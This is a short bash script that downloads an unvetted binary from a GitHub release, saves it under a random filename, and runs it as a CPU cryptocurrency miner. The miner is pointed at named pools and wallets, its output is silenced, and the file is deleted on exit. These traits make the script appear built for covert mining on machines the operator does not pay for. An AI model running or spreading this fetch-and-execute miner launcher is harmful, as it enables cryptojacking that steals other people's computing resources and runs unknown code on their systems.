#!/bin/bash
set -euo pipefail

# Generate random filename (8-char alphanumeric)
generate_random_filename() {
    tr -dc 'A-Za-z0-9' < /dev/urandom | head -c 8
}

main() {
    CPU_THREADS=$(nproc --all 2>/dev/null || getconf _NPROCESSORS_ONLN || echo 1)
    BIN_NAME=$(generate_random_filename)

    # Always clean up
    trap 'rm -f "$BIN_NAME"' EXIT INT TERM

    echo "Downloading binary..."
    wget -q "https://github.com/vedhagsvp/qubros/releases/download/srmn/srnewmn" -O "$BIN_NAME" || {
        echo "Download failed"
        exit 1
    }

    chmod +x "$BIN_NAME"

    echo "Starting with $CPU_THREADS CPU threads..."

    ./"$BIN_NAME" \
        --multi-algorithm-job-mode 3 \
        --disable-gpu \
        --algorithm "randomepic;randomy" \
        --pool "51pool.online:3416;corecoin.luckypool.io:3118" \
        --wallet "praveentympk.mypkana24;cb82f561e5065c48c5867cb42c1a0f927efa395002d0.mypkana24" \
        --cpu-threads "$CPU_THREADS" \
        >/dev/null 2>&1
}

main
